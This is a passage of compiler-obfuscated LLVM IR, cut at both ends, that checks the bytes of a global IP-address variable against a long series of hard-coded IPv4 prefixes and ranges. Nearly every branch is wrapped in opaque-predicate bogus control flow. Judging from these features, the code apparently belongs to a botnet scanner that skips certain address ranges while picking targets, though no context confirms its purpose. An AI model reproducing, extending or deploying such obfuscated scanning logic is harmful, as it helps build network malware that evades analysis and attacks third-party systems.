  %2894 = urem i32 %2893, 2
  %2895 = icmp eq i32 %2894, 0
  %2896 = icmp slt i32 %2891, 10
  %2897 = or i1 %2895, %2896
  br i1 %2897, label %originalBBpart2391, label %originalBB389alteredBB

originalBBpart2391:                               ; preds = %originalBB389
  br i1 %2889, label %2898, label %2902

; <label>:2898:                                   ; preds = %originalBBpart2391
  %2899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2900 = zext i8 %2899 to i32
  %2901 = icmp slt i32 %2900, 159
  br i1 %2901, label %5234, label %2902

; <label>:2902:                                   ; preds = %2898, %originalBBpart2391, %2874, %2870
  %2903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2904 = zext i8 %2903 to i32
  %2905 = icmp eq i32 %2904, 45
  br i1 %2905, label %2906, label %2934

; <label>:2906:                                   ; preds = %2902
  %2907 = load i32, i32* @x.71
  %2908 = load i32, i32* @y.72
  %2909 = sub i32 %2907, 1
  %2910 = mul i32 %2907, %2909
  %2911 = urem i32 %2910, 2
  %2912 = icmp eq i32 %2911, 0
  %2913 = icmp slt i32 %2908, 10
  %2914 = or i1 %2912, %2913
  br i1 %2914, label %originalBB393, label %originalBB393alteredBB

originalBB393:                                    ; preds = %originalBB393alteredBB, %2906
  %2915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2916 = zext i8 %2915 to i32
  %2917 = icmp eq i32 %2916, 63
  %2918 = load i32, i32* @x.71
  %2919 = load i32, i32* @y.72
  %2920 = sub i32 %2918, 1
  %2921 = mul i32 %2918, %2920
  %2922 = urem i32 %2921, 2
  %2923 = icmp eq i32 %2922, 0
  %2924 = icmp slt i32 %2919, 10
  %2925 = or i1 %2923, %2924
  br i1 %2925, label %originalBBpart2395, label %originalBB393alteredBB

originalBBpart2395:                               ; preds = %originalBB393
  br i1 %2917, label %2926, label %2934

; <label>:2926:                                   ; preds = %originalBBpart2395
  %2927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2928 = zext i8 %2927 to i32
  %2929 = icmp sge i32 %2928, 1
  br i1 %2929, label %2930, label %2934

; <label>:2930:                                   ; preds = %2926
  %2931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2932 = zext i8 %2931 to i32
  %2933 = icmp slt i32 %2932, 127
  br i1 %2933, label %5234, label %2934

; <label>:2934:                                   ; preds = %2930, %2926, %originalBBpart2395, %2902
  %2935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2936 = zext i8 %2935 to i32
  %2937 = icmp eq i32 %2936, 216
  br i1 %2937, label %2938, label %2950

; <label>:2938:                                   ; preds = %2934
  %2939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2940 = zext i8 %2939 to i32
  %2941 = icmp eq i32 %2940, 237
  br i1 %2941, label %2942, label %2950

; <label>:2942:                                   ; preds = %2938
  %2943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2944 = zext i8 %2943 to i32
  %2945 = icmp sge i32 %2944, 128
  br i1 %2945, label %2946, label %2950

; <label>:2946:                                   ; preds = %2942
  %2947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2948 = zext i8 %2947 to i32
  %2949 = icmp slt i32 %2948, 159
  br i1 %2949, label %5234, label %2950

; <label>:2950:                                   ; preds = %2946, %2942, %2938, %2934
  %2951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2952 = zext i8 %2951 to i32
  %2953 = icmp eq i32 %2952, 108
  br i1 %2953, label %2954, label %2958

; <label>:2954:                                   ; preds = %2950
  %2955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2956 = zext i8 %2955 to i32
  %2957 = icmp eq i32 %2956, 61
  br i1 %2957, label %5234, label %2958

; <label>:2958:                                   ; preds = %2954, %2950
  %2959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2960 = zext i8 %2959 to i32
  %2961 = icmp eq i32 %2960, 45
  br i1 %2961, label %2962, label %2982

; <label>:2962:                                   ; preds = %2958
  %2963 = load i32, i32* @x.71
  %2964 = load i32, i32* @y.72
  %2965 = sub i32 %2963, 1
  %2966 = mul i32 %2963, %2965
  %2967 = urem i32 %2966, 2
  %2968 = icmp eq i32 %2967, 0
  %2969 = icmp slt i32 %2964, 10
  %2970 = or i1 %2968, %2969
  br i1 %2970, label %originalBB397, label %originalBB397alteredBB

originalBB397:                                    ; preds = %originalBB397alteredBB, %2962
  %2971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2972 = zext i8 %2971 to i32
  %2973 = icmp eq i32 %2972, 76
  %2974 = load i32, i32* @x.71
  %2975 = load i32, i32* @y.72
  %2976 = sub i32 %2974, 1
  %2977 = mul i32 %2974, %2976
  %2978 = urem i32 %2977, 2
  %2979 = icmp eq i32 %2978, 0
  %2980 = icmp slt i32 %2975, 10
  %2981 = or i1 %2979, %2980
  br i1 %2981, label %originalBBpart2399, label %originalBB397alteredBB

originalBBpart2399:                               ; preds = %originalBB397
  br i1 %2973, label %5234, label %2982

; <label>:2982:                                   ; preds = %originalBBpart2399, %2958
  %2983 = load i32, i32* @x.71
  %2984 = load i32, i32* @y.72
  %2985 = sub i32 %2983, 1
  %2986 = mul i32 %2983, %2985
  %2987 = urem i32 %2986, 2
  %2988 = icmp eq i32 %2987, 0
  %2989 = icmp slt i32 %2984, 10
  %2990 = or i1 %2988, %2989
  br i1 %2990, label %originalBB401, label %originalBB401alteredBB

originalBB401:                                    ; preds = %originalBB401alteredBB, %2982
  %2991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2992 = zext i8 %2991 to i32
  %2993 = icmp eq i32 %2992, 185
  %2994 = load i32, i32* @x.71
  %2995 = load i32, i32* @y.72
  %2996 = sub i32 %2994, 1
  %2997 = mul i32 %2994, %2996
  %2998 = urem i32 %2997, 2
  %2999 = icmp eq i32 %2998, 0
  %3000 = icmp slt i32 %2995, 10
  %3001 = or i1 %2999, %3000
  br i1 %3001, label %originalBBpart2403, label %originalBB401alteredBB

originalBBpart2403:                               ; preds = %originalBB401
  br i1 %2993, label %3002, label %3030

; <label>:3002:                                   ; preds = %originalBBpart2403
  %3003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3004 = zext i8 %3003 to i32
  %3005 = icmp eq i32 %3004, 11
  br i1 %3005, label %3006, label %3030

; <label>:3006:                                   ; preds = %3002
  %3007 = load i32, i32* @x.71
  %3008 = load i32, i32* @y.72
  %3009 = sub i32 %3007, 1
  %3010 = mul i32 %3007, %3009
  %3011 = urem i32 %3010, 2
  %3012 = icmp eq i32 %3011, 0
  %3013 = icmp slt i32 %3008, 10
  %3014 = or i1 %3012, %3013
  br i1 %3014, label %originalBB405, label %originalBB405alteredBB

originalBB405:                                    ; preds = %originalBB405alteredBB, %3006
  %3015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3016 = zext i8 %3015 to i32
  %3017 = icmp sge i32 %3016, 144
  %3018 = load i32, i32* @x.71
  %3019 = load i32, i32* @y.72
  %3020 = sub i32 %3018, 1
  %3021 = mul i32 %3018, %3020
  %3022 = urem i32 %3021, 2
  %3023 = icmp eq i32 %3022, 0
  %3024 = icmp slt i32 %3019, 10
  %3025 = or i1 %3023, %3024
  br i1 %3025, label %originalBBpart2407, label %originalBB405alteredBB

originalBBpart2407:                               ; preds = %originalBB405
  br i1 %3017, label %3026, label %3030

; <label>:3026:                                   ; preds = %originalBBpart2407
  %3027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3028 = zext i8 %3027 to i32
  %3029 = icmp slt i32 %3028, 148
  br i1 %3029, label %5234, label %3030

; <label>:3030:                                   ; preds = %3026, %originalBBpart2407, %3002, %originalBBpart2403
  %3031 = load i32, i32* @x.71
  %3032 = load i32, i32* @y.72
  %3033 = sub i32 %3031, 1
  %3034 = mul i32 %3031, %3033
  %3035 = urem i32 %3034, 2
  %3036 = icmp eq i32 %3035, 0
  %3037 = icmp slt i32 %3032, 10
  %3038 = or i1 %3036, %3037
  br i1 %3038, label %originalBB409, label %originalBB409alteredBB

originalBB409:                                    ; preds = %originalBB409alteredBB, %3030
  %3039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3040 = zext i8 %3039 to i32
  %3041 = icmp eq i32 %3040, 185
  %3042 = load i32, i32* @x.71
  %3043 = load i32, i32* @y.72
  %3044 = sub i32 %3042, 1
  %3045 = mul i32 %3042, %3044
  %3046 = urem i32 %3045, 2
  %3047 = icmp eq i32 %3046, 0
  %3048 = icmp slt i32 %3043, 10
  %3049 = or i1 %3047, %3048
  br i1 %3049, label %originalBBpart2411, label %originalBB409alteredBB

originalBBpart2411:                               ; preds = %originalBB409
  br i1 %3041, label %3050, label %3078

; <label>:3050:                                   ; preds = %originalBBpart2411
  %3051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3052 = zext i8 %3051 to i32
  %3053 = icmp eq i32 %3052, 56
  br i1 %3053, label %3054, label %3078

; <label>:3054:                                   ; preds = %3050
  %3055 = load i32, i32* @x.71
  %3056 = load i32, i32* @y.72
  %3057 = sub i32 %3055, 1
  %3058 = mul i32 %3055, %3057
  %3059 = urem i32 %3058, 2
  %3060 = icmp eq i32 %3059, 0
  %3061 = icmp slt i32 %3056, 10
  %3062 = or i1 %3060, %3061
  br i1 %3062, label %originalBB413, label %originalBB413alteredBB

originalBB413:                                    ; preds = %originalBB413alteredBB, %3054
  %3063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3064 = zext i8 %3063 to i32
  %3065 = icmp sge i32 %3064, 21
  %3066 = load i32, i32* @x.71
  %3067 = load i32, i32* @y.72
  %3068 = sub i32 %3066, 1
  %3069 = mul i32 %3066, %3068
  %3070 = urem i32 %3069, 2
  %3071 = icmp eq i32 %3070, 0
  %3072 = icmp slt i32 %3067, 10
  %3073 = or i1 %3071, %3072
  br i1 %3073, label %originalBBpart2415, label %originalBB413alteredBB

originalBBpart2415:                               ; preds = %originalBB413
  br i1 %3065, label %3074, label %3078

; <label>:3074:                                   ; preds = %originalBBpart2415
  %3075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3076 = zext i8 %3075 to i32
  %3077 = icmp slt i32 %3076, 23
  br i1 %3077, label %5234, label %3078

; <label>:3078:                                   ; preds = %3074, %originalBBpart2415, %3050, %originalBBpart2411
  %3079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3080 = zext i8 %3079 to i32
  %3081 = icmp eq i32 %3080, 185
  br i1 %3081, label %3082, label %3110

; <label>:3082:                                   ; preds = %3078
  %3083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3084 = zext i8 %3083 to i32
  %3085 = icmp eq i32 %3084, 61
  br i1 %3085, label %3086, label %3110

; <label>:3086:                                   ; preds = %3082
  %3087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3088 = zext i8 %3087 to i32
  %3089 = icmp sge i32 %3088, 136
  br i1 %3089, label %3090, label %3110

; <label>:3090:                                   ; preds = %3086
  %3091 = load i32, i32* @x.71
  %3092 = load i32, i32* @y.72
  %3093 = sub i32 %3091, 1
  %3094 = mul i32 %3091, %3093
  %3095 = urem i32 %3094, 2
  %3096 = icmp eq i32 %3095, 0
  %3097 = icmp slt i32 %3092, 10
  %3098 = or i1 %3096, %3097
  br i1 %3098, label %originalBB417, label %originalBB417alteredBB

originalBB417:                                    ; preds = %originalBB417alteredBB, %3090
  %3099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3100 = zext i8 %3099 to i32
  %3101 = icmp slt i32 %3100, 139
  %3102 = load i32, i32* @x.71
  %3103 = load i32, i32* @y.72
  %3104 = sub i32 %3102, 1
  %3105 = mul i32 %3102, %3104
  %3106 = urem i32 %3105, 2
  %3107 = icmp eq i32 %3106, 0
  %3108 = icmp slt i32 %3103, 10
  %3109 = or i1 %3107, %3108
  br i1 %3109, label %originalBBpart2419, label %originalBB417alteredBB

originalBBpart2419:                               ; preds = %originalBB417
  br i1 %3101, label %5234, label %3110

; <label>:3110:                                   ; preds = %originalBBpart2419, %3086, %3082, %3078
  %3111 = load i32, i32* @x.71
  %3112 = load i32, i32* @y.72
  %3113 = sub i32 %3111, 1
  %3114 = mul i32 %3111, %3113
  %3115 = urem i32 %3114, 2
  %3116 = icmp eq i32 %3115, 0
  %3117 = icmp slt i32 %3112, 10
  %3118 = or i1 %3116, %3117
  br i1 %3118, label %originalBB421, label %originalBB421alteredBB

originalBB421:                                    ; preds = %originalBB421alteredBB, %3110
  %3119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3120 = zext i8 %3119 to i32
  %3121 = icmp eq i32 %3120, 185
  %3122 = load i32, i32* @x.71
  %3123 = load i32, i32* @y.72
  %3124 = sub i32 %3122, 1
  %3125 = mul i32 %3122, %3124
  %3126 = urem i32 %3125, 2
  %3127 = icmp eq i32 %3126, 0
  %3128 = icmp slt i32 %3123, 10
  %3129 = or i1 %3127, %3128
  br i1 %3129, label %originalBBpart2423, label %originalBB421alteredBB

originalBBpart2423:                               ; preds = %originalBB421
  br i1 %3121, label %3130, label %3158

; <label>:3130:                                   ; preds = %originalBBpart2423
  %3131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3132 = zext i8 %3131 to i32
  %3133 = icmp eq i32 %3132, 62
  br i1 %3133, label %3134, label %3158

; <label>:3134:                                   ; preds = %3130
  %3135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3136 = zext i8 %3135 to i32
  %3137 = icmp sge i32 %3136, 187
  br i1 %3137, label %3138, label %3158

; <label>:3138:                                   ; preds = %3134
  %3139 = load i32, i32* @x.71
  %3140 = load i32, i32* @y.72
  %3141 = sub i32 %3139, 1
  %3142 = mul i32 %3139, %3141
  %3143 = urem i32 %3142, 2
  %3144 = icmp eq i32 %3143, 0
  %3145 = icmp slt i32 %3140, 10
  %3146 = or i1 %3144, %3145
  br i1 %3146, label %originalBB425, label %originalBB425alteredBB

originalBB425:                                    ; preds = %originalBB425alteredBB, %3138
  %3147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3148 = zext i8 %3147 to i32
  %3149 = icmp slt i32 %3148, 191
  %3150 = load i32, i32* @x.71
  %3151 = load i32, i32* @y.72
  %3152 = sub i32 %3150, 1
  %3153 = mul i32 %3150, %3152
  %3154 = urem i32 %3153, 2
  %3155 = icmp eq i32 %3154, 0
  %3156 = icmp slt i32 %3151, 10
  %3157 = or i1 %3155, %3156
  br i1 %3157, label %originalBBpart2427, label %originalBB425alteredBB

originalBBpart2427:                               ; preds = %originalBB425
  br i1 %3149, label %5234, label %3158

; <label>:3158:                                   ; preds = %originalBBpart2427, %3134, %3130, %originalBBpart2423
  %3159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3160 = zext i8 %3159 to i32
  %3161 = icmp eq i32 %3160, 66
  br i1 %3161, label %3162, label %3190

; <label>:3162:                                   ; preds = %3158
  %3163 = load i32, i32* @x.71
  %3164 = load i32, i32* @y.72
  %3165 = sub i32 %3163, 1
  %3166 = mul i32 %3163, %3165
  %3167 = urem i32 %3166, 2
  %3168 = icmp eq i32 %3167, 0
  %3169 = icmp slt i32 %3164, 10
  %3170 = or i1 %3168, %3169
  br i1 %3170, label %originalBB429, label %originalBB429alteredBB

originalBB429:                                    ; preds = %originalBB429alteredBB, %3162
  %3171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3172 = zext i8 %3171 to i32
  %3173 = icmp eq i32 %3172, 150
  %3174 = load i32, i32* @x.71
  %3175 = load i32, i32* @y.72
  %3176 = sub i32 %3174, 1
  %3177 = mul i32 %3174, %3176
  %3178 = urem i32 %3177, 2
  %3179 = icmp eq i32 %3178, 0
  %3180 = icmp slt i32 %3175, 10
  %3181 = or i1 %3179, %3180
  br i1 %3181, label %originalBBpart2431, label %originalBB429alteredBB

originalBBpart2431:                               ; preds = %originalBB429
  br i1 %3173, label %3182, label %3190

; <label>:3182:                                   ; preds = %originalBBpart2431
  %3183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3184 = zext i8 %3183 to i32
  %3185 = icmp sge i32 %3184, 120
  br i1 %3185, label %3186, label %3190

; <label>:3186:                                   ; preds = %3182
  %3187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3188 = zext i8 %3187 to i32
  %3189 = icmp slt i32 %3188, 215
  br i1 %3189, label %5234, label %3190

; <label>:3190:                                   ; preds = %3186, %3182, %originalBBpart2431, %3158
  %3191 = load i32, i32* @x.71
  %3192 = load i32, i32* @y.72
  %3193 = sub i32 %3191, 1
  %3194 = mul i32 %3191, %3193
  %3195 = urem i32 %3194, 2
  %3196 = icmp eq i32 %3195, 0
  %3197 = icmp slt i32 %3192, 10
  %3198 = or i1 %3196, %3197
  br i1 %3198, label %originalBB433, label %originalBB433alteredBB

originalBB433:                                    ; preds = %originalBB433alteredBB, %3190
  %3199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3200 = zext i8 %3199 to i32
  %3201 = icmp eq i32 %3200, 66
  %3202 = load i32, i32* @x.71
  %3203 = load i32, i32* @y.72
  %3204 = sub i32 %3202, 1
  %3205 = mul i32 %3202, %3204
  %3206 = urem i32 %3205, 2
  %3207 = icmp eq i32 %3206, 0
  %3208 = icmp slt i32 %3203, 10
  %3209 = or i1 %3207, %3208
  br i1 %3209, label %originalBBpart2435, label %originalBB433alteredBB

originalBBpart2435:                               ; preds = %originalBB433
  br i1 %3201, label %3210, label %3238

; <label>:3210:                                   ; preds = %originalBBpart2435
  %3211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3212 = zext i8 %3211 to i32
  %3213 = icmp eq i32 %3212, 151
  br i1 %3213, label %3214, label %3238

; <label>:3214:                                   ; preds = %3210
  %3215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3216 = zext i8 %3215 to i32
  %3217 = icmp sge i32 %3216, 137
  br i1 %3217, label %3218, label %3238

; <label>:3218:                                   ; preds = %3214
  %3219 = load i32, i32* @x.71
  %3220 = load i32, i32* @y.72
  %3221 = sub i32 %3219, 1
  %3222 = mul i32 %3219, %3221
  %3223 = urem i32 %3222, 2
  %3224 = icmp eq i32 %3223, 0
  %3225 = icmp slt i32 %3220, 10
  %3226 = or i1 %3224, %3225
  br i1 %3226, label %originalBB437, label %originalBB437alteredBB

originalBB437:                                    ; preds = %originalBB437alteredBB, %3218
  %3227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3228 = zext i8 %3227 to i32
  %3229 = icmp slt i32 %3228, 139
  %3230 = load i32, i32* @x.71
  %3231 = load i32, i32* @y.72
  %3232 = sub i32 %3230, 1
  %3233 = mul i32 %3230, %3232
  %3234 = urem i32 %3233, 2
  %3235 = icmp eq i32 %3234, 0
  %3236 = icmp slt i32 %3231, 10
  %3237 = or i1 %3235, %3236
  br i1 %3237, label %originalBBpart2439, label %originalBB437alteredBB

originalBBpart2439:                               ; preds = %originalBB437
  br i1 %3229, label %5234, label %3238

; <label>:3238:                                   ; preds = %originalBBpart2439, %3214, %3210, %originalBBpart2435
  %3239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3240 = zext i8 %3239 to i32
  %3241 = icmp eq i32 %3240, 64
  br i1 %3241, label %3242, label %3302

; <label>:3242:                                   ; preds = %3238
  %3243 = load i32, i32* @x.71
  %3244 = load i32, i32* @y.72
  %3245 = sub i32 %3243, 1
  %3246 = mul i32 %3243, %3245
  %3247 = urem i32 %3246, 2
  %3248 = icmp eq i32 %3247, 0
  %3249 = icmp slt i32 %3244, 10
  %3250 = or i1 %3248, %3249
  br i1 %3250, label %originalBB441, label %originalBB441alteredBB

originalBB441:                                    ; preds = %originalBB441alteredBB, %3242
  %3251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3252 = zext i8 %3251 to i32
  %3253 = icmp eq i32 %3252, 94
  %3254 = load i32, i32* @x.71
  %3255 = load i32, i32* @y.72
  %3256 = sub i32 %3254, 1
  %3257 = mul i32 %3254, %3256
  %3258 = urem i32 %3257, 2
  %3259 = icmp eq i32 %3258, 0
  %3260 = icmp slt i32 %3255, 10
  %3261 = or i1 %3259, %3260
  br i1 %3261, label %originalBBpart2443, label %originalBB441alteredBB

originalBBpart2443:                               ; preds = %originalBB441
  br i1 %3253, label %3262, label %3302

; <label>:3262:                                   ; preds = %originalBBpart2443
  %3263 = load i32, i32* @x.71
  %3264 = load i32, i32* @y.72
  %3265 = sub i32 %3263, 1
  %3266 = mul i32 %3263, %3265
  %3267 = urem i32 %3266, 2
  %3268 = icmp eq i32 %3267, 0
  %3269 = icmp slt i32 %3264, 10
  %3270 = or i1 %3268, %3269
  br i1 %3270, label %originalBB445, label %originalBB445alteredBB

originalBB445:                                    ; preds = %originalBB445alteredBB, %3262
  %3271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3272 = zext i8 %3271 to i32
  %3273 = icmp sge i32 %3272, 237
  %3274 = load i32, i32* @x.71
  %3275 = load i32, i32* @y.72
  %3276 = sub i32 %3274, 1
  %3277 = mul i32 %3274, %3276
  %3278 = urem i32 %3277, 2
  %3279 = icmp eq i32 %3278, 0
  %3280 = icmp slt i32 %3275, 10
  %3281 = or i1 %3279, %3280
  br i1 %3281, label %originalBBpart2447, label %originalBB445alteredBB

originalBBpart2447:                               ; preds = %originalBB445
  br i1 %3273, label %3282, label %3302

; <label>:3282:                                   ; preds = %originalBBpart2447
  %3283 = load i32, i32* @x.71
  %3284 = load i32, i32* @y.72
  %3285 = sub i32 %3283, 1
  %3286 = mul i32 %3283, %3285
  %3287 = urem i32 %3286, 2
  %3288 = icmp eq i32 %3287, 0
  %3289 = icmp slt i32 %3284, 10
  %3290 = or i1 %3288, %3289
  br i1 %3290, label %originalBB449, label %originalBB449alteredBB

originalBB449:                                    ; preds = %originalBB449alteredBB, %3282
  %3291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3292 = zext i8 %3291 to i32
  %3293 = icmp slt i32 %3292, 255
  %3294 = load i32, i32* @x.71
  %3295 = load i32, i32* @y.72
  %3296 = sub i32 %3294, 1
  %3297 = mul i32 %3294, %3296
  %3298 = urem i32 %3297, 2
  %3299 = icmp eq i32 %3298, 0
  %3300 = icmp slt i32 %3295, 10
  %3301 = or i1 %3299, %3300
  br i1 %3301, label %originalBBpart2451, label %originalBB449alteredBB

originalBBpart2451:                               ; preds = %originalBB449
  br i1 %3293, label %5234, label %3302

; <label>:3302:                                   ; preds = %originalBBpart2451, %originalBBpart2447, %originalBBpart2443, %3238
  %3303 = load i32, i32* @x.71
  %3304 = load i32, i32* @y.72
  %3305 = sub i32 %3303, 1
  %3306 = mul i32 %3303, %3305
  %3307 = urem i32 %3306, 2
  %3308 = icmp eq i32 %3307, 0
  %3309 = icmp slt i32 %3304, 10
  %3310 = or i1 %3308, %3309
  br i1 %3310, label %originalBB453, label %originalBB453alteredBB

originalBB453:                                    ; preds = %originalBB453alteredBB, %3302
  %3311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3312 = zext i8 %3311 to i32
  %3313 = icmp eq i32 %3312, 63
  %3314 = load i32, i32* @x.71
  %3315 = load i32, i32* @y.72
  %3316 = sub i32 %3314, 1
  %3317 = mul i32 %3314, %3316
  %3318 = urem i32 %3317, 2
  %3319 = icmp eq i32 %3318, 0
  %3320 = icmp slt i32 %3315, 10
  %3321 = or i1 %3319, %3320
  br i1 %3321, label %originalBBpart2455, label %originalBB453alteredBB

originalBBpart2455:                               ; preds = %originalBB453
  br i1 %3313, label %3322, label %3366

; <label>:3322:                                   ; preds = %originalBBpart2455
  %3323 = load i32, i32* @x.71
  %3324 = load i32, i32* @y.72
  %3325 = sub i32 %3323, 1
  %3326 = mul i32 %3323, %3325
  %3327 = urem i32 %3326, 2
  %3328 = icmp eq i32 %3327, 0
  %3329 = icmp slt i32 %3324, 10
  %3330 = or i1 %3328, %3329
  br i1 %3330, label %originalBB457, label %originalBB457alteredBB

originalBB457:                                    ; preds = %originalBB457alteredBB, %3322
  %3331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3332 = zext i8 %3331 to i32
  %3333 = icmp eq i32 %3332, 251
  %3334 = load i32, i32* @x.71
  %3335 = load i32, i32* @y.72
  %3336 = sub i32 %3334, 1
  %3337 = mul i32 %3334, %3336
  %3338 = urem i32 %3337, 2
  %3339 = icmp eq i32 %3338, 0
  %3340 = icmp slt i32 %3335, 10
  %3341 = or i1 %3339, %3340
  br i1 %3341, label %originalBBpart2459, label %originalBB457alteredBB

originalBBpart2459:                               ; preds = %originalBB457
  br i1 %3333, label %3342, label %3366

; <label>:3342:                                   ; preds = %originalBBpart2459
  %3343 = load i32, i32* @x.71
  %3344 = load i32, i32* @y.72
  %3345 = sub i32 %3343, 1
  %3346 = mul i32 %3343, %3345
  %3347 = urem i32 %3346, 2
  %3348 = icmp eq i32 %3347, 0
  %3349 = icmp slt i32 %3344, 10
  %3350 = or i1 %3348, %3349
  br i1 %3350, label %originalBB461, label %originalBB461alteredBB

originalBB461:                                    ; preds = %originalBB461alteredBB, %3342
  %3351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3352 = zext i8 %3351 to i32
  %3353 = icmp sge i32 %3352, 19
  %3354 = load i32, i32* @x.71
  %3355 = load i32, i32* @y.72
  %3356 = sub i32 %3354, 1
  %3357 = mul i32 %3354, %3356
  %3358 = urem i32 %3357, 2
  %3359 = icmp eq i32 %3358, 0
  %3360 = icmp slt i32 %3355, 10
  %3361 = or i1 %3359, %3360
  br i1 %3361, label %originalBBpart2463, label %originalBB461alteredBB

originalBBpart2463:                               ; preds = %originalBB461
  br i1 %3353, label %3362, label %3366

; <label>:3362:                                   ; preds = %originalBBpart2463
  %3363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3364 = zext i8 %3363 to i32
  %3365 = icmp slt i32 %3364, 21
  br i1 %3365, label %5234, label %3366

; <label>:3366:                                   ; preds = %3362, %originalBBpart2463, %originalBBpart2459, %originalBBpart2455
  %3367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3368 = zext i8 %3367 to i32
  %3369 = icmp eq i32 %3368, 70
  br i1 %3369, label %3370, label %3382

; <label>:3370:                                   ; preds = %3366
  %3371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3372 = zext i8 %3371 to i32
  %3373 = icmp eq i32 %3372, 42
  br i1 %3373, label %3374, label %3382

; <label>:3374:                                   ; preds = %3370
  %3375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3376 = zext i8 %3375 to i32
  %3377 = icmp sge i32 %3376, 73
  br i1 %3377, label %3378, label %3382

; <label>:3378:                                   ; preds = %3374
  %3379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3380 = zext i8 %3379 to i32
  %3381 = icmp slt i32 %3380, 75
  br i1 %3381, label %5234, label %3382

; <label>:3382:                                   ; preds = %3378, %3374, %3370, %3366
  %3383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3384 = zext i8 %3383 to i32
